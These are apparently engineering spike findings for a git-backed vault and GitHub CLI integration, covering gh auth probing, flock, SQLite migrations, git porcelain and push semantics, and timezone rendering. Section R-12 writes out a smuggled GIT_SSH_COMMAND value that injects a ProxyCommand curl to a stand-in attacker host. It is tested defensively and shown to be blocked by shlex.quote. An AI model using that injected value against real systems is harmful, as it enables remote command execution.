# Phase 8 — Spike findings

Дата: 2026-04-19
Probes: `spikes/phase8/spike_*.py` (10 штук)
Среда: macOS 15.7.5 (Darwin 24.6.0), arm64, Python 3.12.13, git 2.39.5 (Apple), gh 2.89.0
Все reports сохранены рядом: `spikes/phase8/spike_<name>_report.json` / `.txt`.

---

## R-1 + R-15 — `gh auth status` shapes, HOME discovery

Probes: `spike_gh_auth_shapes.py`, `spike_gh_home_probe.py`.

**Empirical facts (gh 2.89.0 on macOS):**

| HOME state | rc | stderr shape | stdout shape |
|---|---|---|---|
| Empty dir (no `~/.config/gh/hosts.yml`) | 1 | `You are not logged into any GitHub hosts. To log in, run: gh auth login\n` | empty |
| Real HOME, logged in | 0 | empty | multi-line: `github.com\n  ✓ Logged in to github.com account <login> (keyring)\n  - Active account: true\n  - Git operations protocol: ssh\n  - Token: gho_*...*\n  - Token scopes: '...'\n` |
| Real HOME, `hosts.yml` hidden | 1 | same as empty-HOME case (single line) | empty |

**`--json` flag (R-1):** gh 2.89 supports `--json hosts` only. `--json user` → rc=1 with `Unknown JSON field: "user"\nAvailable fields:\n  hosts\n` on stderr. **Do NOT use `--json`; rely on rc + stderr text parsing.**

**HOME discovery behaviour (R-15 B7):** gh reads `$HOME/.config/gh/hosts.yml` for auth config. No XDG_CONFIG_HOME fallback observed. `HOME=/tmp/empty` → unauthenticated; `HOME=$REAL_HOME` → authed.

**Recommendation for `_verify_gh_config_accessible(home, timeout_s=10.0)`:**

```python
@dataclass
class GhConfigProbe:
    ok: bool
    home: str
    rc: int | None
    reason: str   # 'authed' | 'not_logged_in' | 'gh_not_on_path' | 'timeout'

def _verify_gh_config_accessible(home: Path) -> GhConfigProbe:
    if shutil.which("gh") is None:
        return GhConfigProbe(False, str(home), None, "gh_not_on_path")
    env = {"HOME": str(home), "PATH": os.environ.get("PATH", "")}
    # Scrub token env (Q2 decision)
    for k in ("GH_TOKEN", "GITHUB_TOKEN"):
        env.pop(k, None)
    try:
        proc = subprocess.run(
            ["gh", "auth", "status", "--hostname", "github.com"],
            env=env, capture_output=True, text=True, timeout=10.0,
        )
    except subprocess.TimeoutExpired:
        return GhConfigProbe(False, str(home), None, "timeout")
    ok = proc.returncode == 0
    low = proc.stderr.lower()
    if ok:
        reason = "authed"
    elif "not logged in" in low or "not logged into" in low:
        reason = "not_logged_in"
    else:
        reason = "unknown_error"
    return GhConfigProbe(ok, str(home), proc.returncode, reason)
```

Daemon.start: log warning `gh_config_not_accessible home=... reason=...`, proceed (seed still runs; first `gh issue create` will return exit 4 if really broken).

**Edge:** when running as a systemd user service / launchd agent, HOME may default to `/var/empty` or the service directory — owner MUST export `HOME` explicitly in service unit. Document in `docs/ops/github-setup.md`.

---

## R-4 — `fcntl.flock` auto-release on SIGKILL

Probe: `spike_flock_oom.py`.

**Empirical (macOS Darwin 24):** Kernel releases flock immediately on SIGKILL. Parent re-acquisition elapsed ≈ **0.003 ms** (sub-millisecond). Before-kill acquisition attempt was correctly blocked with `BlockingIOError`.

**Conclusion:** Invariant I-8.2 (`fcntl.flock(LOCK_EX | LOCK_NB)` + `BlockingIOError` → exit 9) is safe against OOM-killed predecessors. No manual cleanup / stale-PID-file logic required. Kernel does the right thing.

---

## R-5 — flock wait semantics (Q1 closed without spike)

Closed via owner Q1: use `LOCK_NB`, fail-fast `exit 9`. Not re-probed. The R-4 probe proves kernel side of the contract.

---

## R-6 — Migration `0005_schedule_seed_key.sql` shape

Probe: `spike_sqlite_alter_table.py`.

**Empirical (sqlite3 bundled with Python 3.12):**

- `ALTER TABLE schedules ADD COLUMN seed_key TEXT;` applied on v3-shape table preserves 10 pre-existing rows; all get `seed_key IS NULL`.
- Partial `UNIQUE INDEX idx_schedules_seed_key ... WHERE seed_key IS NOT NULL` works as expected:
  - Two rows with `NULL` seed_key → **allowed** (partial index excludes NULLs).
  - Two rows with same non-NULL seed_key → `sqlite3.IntegrityError: UNIQUE constraint failed: schedules.seed_key`.
- `PRAGMA user_version = 5` sets correctly.
- Chained `user_version = 6` migration for `seed_tombstones` table applies without issue.
- `INSERT OR REPLACE INTO seed_tombstones(seed_key) VALUES (?)` idempotent on re-insert with same key.

**Recommendation:** the migration SQL given in detailed-plan §4 C5 can be shipped verbatim. Add idempotent `IF NOT EXISTS` to the INDEX (already present) and the tombstone TABLE creation. Consider wrapping both statements in `BEGIN IMMEDIATE`/`COMMIT` via `_apply_v5` / `_apply_v6` symmetric to existing `_apply_v4`.

---

## R-7 — `git commit --only -- <path>` semantics

Probe: `spike_git_commit_only.py`.

**Empirical (git 2.39.5 Apple):**

- `git add .` stages changes in BOTH `dir_a/a.md` (modified) and `dir_b/b.md` (modified).
- `git commit --only -- dir_a/` commits ONLY `dir_a/a.md`. `git show --name-only` on HEAD confirms only `dir_a/a.md` appears.
- `dir_b/b.md` remains staged after the commit; `git diff --cached --quiet -- dir_b/` returns rc=1 (still staged).

**Conclusion:** `--only` is the correct defence-in-depth mechanism per I-8.1. Even if `git add` accidentally stages something outside vault_dir (shouldn't happen because we `cd vault_dir`), `--only -- <vault_relpath>` guarantees the commit contains exactly those paths.

**But:** detailed-plan §4 C4 already uses `git -C <vault_dir>` + `git add -A` where vault_dir is a STANDALONE repo (Q9). The vault_dir is its own working tree so `-A` only touches vault_dir contents. **`--only` is not strictly needed in the Q9 topology**, but keep it as a belt-and-suspenders guard.

---

## R-8 + R-14 — Vault-dir bootstrap + push to local bare repo

Probe: `spike_vault_bootstrap.py`.

**Empirical:**

1. `git init --bare /tmp/vault-bare.git` creates a valid receiver.
2. Bootstrap in vault_dir: `git init -b main` → `git remote add vault-backup file:///.../vault-bare.git` → `git commit --allow-empty -m "bootstrap"` → `git push vault-backup main` → **rc=0**; bare repo has `refs/heads/main` populated.
3. Second push (after real commit) → rc=0, fast-forward.
4. Divergence scenario (two clones, both commit, sequential push): first push rc=0; second push rc=1 with stderr matching both `rejected` and `non-fast-forward` / `fetch first` patterns.

**Stderr markers for exit 7 mapping:**

```
! [rejected]        main -> main (fetch first)
error: failed to push some refs to 'file:///.../vault-bare.git'
hint: Updates were rejected because the remote contains work that you do
hint: not have locally.
```

Substrings for detection (case-insensitive): `rejected`, `non-fast-forward`, `fetch first`, `updates were rejected`.

**Recommendation:**

- `tools/gh/_lib/vault_git_init.bootstrap(vault_dir, settings)` — five subprocess calls in order: `git init -b {branch}`, `git remote add {name} {url}`, `git commit --allow-empty -m "bootstrap"` (with `-c user.email=... -c user.name=...`), `git push {name} {branch}`.
- For divergence detection, use stderr substring match (not rc-only) — both rc=1 AND text marker. Sample pattern: `re.search(r"\b(rejected|non-fast-forward|fetch first)\b", stderr, re.IGNORECASE)`.
- Local bare repo as test infrastructure works perfectly — `file://` URLs bypass ssh entirely. `GIT_SSH_COMMAND` is ignored for `file://` transport, so tests don't need ssh fixtures.

---

## R-9 — `git status --porcelain` output shape

Probe: `spike_git_status_porcelain.py`.

**Empirical prefix shapes (porcelain=v1):**

| State | Prefix (2 chars + space + path) | Sample |
|---|---|---|
| Untracked | `?? ` | `?? untracked.md` |
| Modified in worktree (unstaged) | ` M ` | ` M to_be_modified.md` |
| Deleted in worktree (unstaged) | ` D ` | ` D to_be_deleted.md` |
| Added in index (staged) | `A  ` | `A  added_staged.md` |
| Renamed in index (staged) | `R  ` | `R  to_be_renamed.md -> renamed.md` |
| Modified in index (staged) | `M  ` | `M  staged.md` |
| Both staged and worktree modified | `MM` | `MM both.md` |

**Critical B2 evidence:** In an `untracked-only` scenario (no modified/staged files, just an untracked file):
- `git diff --quiet` returns **rc=0** ("nothing to diff" — because diff only considers tracked files).
- `git status --porcelain` returns `?? only_untracked.md\n`.

Therefore `git diff --quiet` MUST NOT be used to detect "something changed" — it misses untracked files. Use `git status --porcelain`: **non-empty output = there's something to commit** (after `git add`).

**Recommendation for step 7 in §4 C4:**

```python
proc = subprocess.run(
    ["git", "-C", str(vault_dir), "status", "--porcelain"],
    capture_output=True, text=True, check=True, timeout=15, env=env,
)
if not proc.stdout.strip():
    return 5  # NO_CHANGES
```

Do NOT use `--porcelain=v2` (no benefit; v1 is stable and widely implemented). `--porcelain` alone is equivalent to `--porcelain=v1`.

**Submodules:** not tested (phase-8 vault has no submodules by design). Document out-of-scope.

---

## R-10 — `zoneinfo` on macOS Darwin 24 for `{date}` rendering

Probe: `spike_zoneinfo_darwin.py`.

**Empirical (Python 3.12.13 on macOS 15.7.5):**

- `zoneinfo` module available in stdlib; **no `tzdata` PyPI package needed** (macOS ships IANA tzdata in `/var/db/timezone/zoneinfo/`).
- `ZoneInfo("Europe/Moscow")` resolves; `datetime.now(ZoneInfo("Europe/Moscow"))` renders correctly.
- Cross-midnight check: anchor `2026-04-18 23:30 UTC`:
  - UTC strftime `%Y-%m-%d` → `2026-04-18`
  - MSK strftime `%Y-%m-%d` → `2026-04-19`
  - **Differ** → B4 fix is justified; commit date MUST render in `auto_commit_tz`, not UTC.
- DST transition Europe/Berlin 2026-03-29 01:00 UTC: offset jumps from +01:00 to +02:00 (verified).
- Invalid zone name → `zoneinfo.ZoneInfoNotFoundError`. Recommend pydantic validator wraps in `ValidationError`.

**Recommendation:**

- Pydantic validator for `auto_commit_tz`:

```python
@field_validator("auto_commit_tz")
@classmethod
def _validate_tz(cls, v: str) -> str:
    try:
        ZoneInfo(v)
    except ZoneInfoNotFoundError as exc:
        raise ValueError(f"unknown timezone: {v}") from exc
    return v
```

- For `{date}` placeholder rendering:

```python
from datetime import datetime
from zoneinfo import ZoneInfo
date_str = datetime.now(ZoneInfo(settings.github.auto_commit_tz)).strftime("%Y-%m-%d")
message = settings.github.commit_message_template.format(date=date_str)
```

- **No `tzdata` PyPI dep required** on the current Mac/Python matrix. Do NOT add it to `pyproject.toml` just for phase 8; let Linux prod hosts install it if/when they hit `ZoneInfoNotFoundError` (document fallback in docs).

---

## R-11 — `seed_tombstones` table (Q10)

Not separately probed beyond R-6 (same DB), but R-6 confirmed:
- Simple INSERT with `seed_key TEXT PRIMARY KEY` works.
- `SELECT EXISTS(SELECT 1 FROM seed_tombstones WHERE seed_key=?)` returns 1 when present — O(1) via PRIMARY KEY.
- `INSERT OR REPLACE` is idempotent.

**Recommendation:** `SchedulerStore.tombstone_exists(seed_key: str) -> bool` — one-row PK lookup, no perf concern.

---

## R-12 — `GIT_SSH_COMMAND` shell-quote sanity

Probe: `spike_git_ssh_command.py`.

**Empirical (git 2.39.5 + a spy `ssh` wrapper on PATH):**

Key finding — **git parses `GIT_SSH_COMMAND` via POSIX shell-splitting** (argv-like, not simple whitespace split). Evidence:

- Plain absolute path `/home/user/.ssh/id_vault` → quoted & unquoted produce identical argv.
- Path with space `/home/user/my keys/id_vault` (**unquoted**) → spy sees args `-i /home/user/my keys/id_vault` split into `[..., '-i', '/home/user/my', 'keys/id_vault', ...]` — path **broken**.
- Same path **quoted via `shlex.quote`** → spy sees `[..., '-i', '/home/user/my keys/id_vault', ...]` — preserved as single arg.
- **Injection attempt** payload `/tmp/id_vault -o ProxyCommand=curl http://evil.example`:
  - **Unquoted** → spy sees `[..., '-i', '/tmp/id_vault', '-o', 'ProxyCommand=curl', 'http://evil.example', ...]` — **attacker controls -o option**; git would happily spawn ssh with injected `ProxyCommand`.
  - **Quoted** → spy sees `[..., '-i', '/tmp/id_vault -o ProxyCommand=curl http://evil.example', ...]` — treated as a single (non-existent) key path; ssh fails cleanly with "no such identity file".

**Conclusion:** B6 mitigation (shlex.quote) is **necessary and sufficient** against shell-split injection in `GIT_SSH_COMMAND`. Combined with the pydantic validator rejecting obviously-bad paths (whitespace, shell metacharacters, substring `" -o "`), the attack surface is closed.

**Recommendation (copy-pasted into implementation.md):**

```python
import shlex
env["GIT_SSH_COMMAND"] = " ".join(
    [
        "ssh",
        "-i", shlex.quote(str(vault_ssh_key_path)),
        "-o", "IdentitiesOnly=yes",
        "-o", "StrictHostKeyChecking=accept-new",
        "-o", f"UserKnownHostsFile={shlex.quote(str(known_hosts_path))}",
    ]
)
```

All non-literal paths go through `shlex.quote`. Additionally, pydantic validator on `vault_ssh_key_path` rejects:
- any whitespace (space, tab, `\n`),
- shell metacharacters `$;&|<>'"\\``,
- substring `" -o "` (paranoid defence against bypassing shlex quoting via clever env override from another process).

UTF-8 / Cyrillic paths pass both unquoted and quoted (git/POSIX accepts UTF-8) — tolerable either way but quoting is still correct.

---

## R-13 / Q11 — `ARTEFACT_RE` v3 on gh CLI corpus

Probe: `spike_artefact_re_corpus.py`.

**Empirical:** 50-entry corpus (commit-sha, git porcelain, JSON pass-through, Russian prose, gh CLI error strings, near-miss URL/relative paths). **false_positive_count = 0**. Full results in `spike_artefact_re_corpus.txt` + report JSON.

**Recommendation:**

- Phase-7 `_ARTEFACT_RE v3` (already in `src/assistant/media/artefacts.py`) does not false-positive on any plausible phase-8 scheduler-turn output.
- Use the same 50-line corpus as `tests/fixtures/gh_responses.txt` + regression test `test_gh_dispatch_reply_no_artefact_match.py` asserting `ARTEFACT_RE.search(line) is None` for all.
- Edge cases that correctly evade: `./data/vault/note.md` (relative path, no leading `/`), `https://.../.png` (preceded by `:/`), `~/.ssh/id_vault.pub` (`.pub` not in `_ALL_EXT`), markdown table rows `data/vault/note.md | 3 +++` (no leading `/`).

---

## Summary by blocker

- **B2 (untracked file detection)** — confirmed. `git diff --quiet` misses untracked; use `git status --porcelain`. Non-empty stdout = changes present. [R-9]
- **B4 (commit-message `{date}` TZ)** — confirmed. `ZoneInfo(auto_commit_tz)` renders correctly on Darwin 24, differs from UTC when day crosses. [R-10]
- **B6 (`GIT_SSH_COMMAND` shell-injection)** — `shlex.quote` is load-bearing. Pydantic path validator recommended. [R-12]
- **B7 (gh HOME discovery)** — HOME must be set correctly in daemon env; gh 2.89 shape documented. [R-1, R-15]
- **B8 (cloud-sync guard on `vault_ssh_key_path.parent`)** — extend existing `_check_data_dir_not_in_cloud_sync` pattern; no spike needed.
- **B9 (push verification via local bare repo)** — works perfectly via `file://` URL. Divergence stderr markers documented. [R-8, R-14]
- **B10 (empty `allowed_repos` warning)** — Daemon.start log warning, no spike needed.
- **Q9 (vault_dir = own git repo)** — bootstrap flow (5 subprocess calls) works. [R-8]
- **Q10 (seed tombstones)** — SQLite `seed_tombstones` table works, PK lookup O(1), idempotent INSERT OR REPLACE. [R-11 sub-result of R-6]
- **Q11 (dispatch_reply invariant)** — corpus of 50 plausible gh CLI model responses has 0 false positives. [R-13]
- **R-4 (flock OOM)** — kernel auto-release works on macOS Darwin 24, sub-millisecond. **I-8.2 safe.**
- **R-6 (migration 0005)** — ALTER + partial UNIQUE INDEX behaviour exactly as plan describes.
- **R-7 (`git commit --only`)** — semantics confirmed: only specified path committed, others stay staged.

## Plan update recommendations

- **None blocking.** detailed-plan r2 + Q9/Q10/Q11 additions stand. All OPEN research questions (R-15, R-16) have clear answers from R-15 probe; R-16 depends on pidfile flock already shipped in phase 5 and is not exploitable.
- **Minor polish suggestions (non-blocking):**
  1. detailed-plan §4 C4 step 7 — add explicit mention "`git status --porcelain` (equivalent to `--porcelain=v1`); non-empty stdout means `git add` should run". Current plan already says porcelain.
  2. §4 C1 field `auto_commit_tz` — explicitly reject unknown zone via pydantic `field_validator` (probe showed `ZoneInfoNotFoundError` must be caught). Plan mentions `parse_cron` validator but not tz validator.
  3. §4 C4 step 13 — the `GIT_SSH_COMMAND` construction should use space-joined `shlex.quote`d tokens rather than ad-hoc string concat to prevent future maintainer bug (same Q12 injection vector rediscovered via copy-paste).
  4. docs/ops/github-setup.md — document the HOME caveat for systemd/launchd user services; gh reads `$HOME/.config/gh/hosts.yml` and non-interactive service envs may have `HOME` unset or wrong.
- **No new open questions raised.** Do NOT block on researcher fix-pack; proceed to devil wave 2 + coder execution.

## File locations

- Probes: `/Users/agent2/Documents/0xone-assistant/spikes/phase8/spike_*.py`
- Reports: `/Users/agent2/Documents/0xone-assistant/spikes/phase8/spike_*_report.json` / `.txt`
- This findings doc: `/Users/agent2/Documents/0xone-assistant/plan/phase8/spike-findings.md`
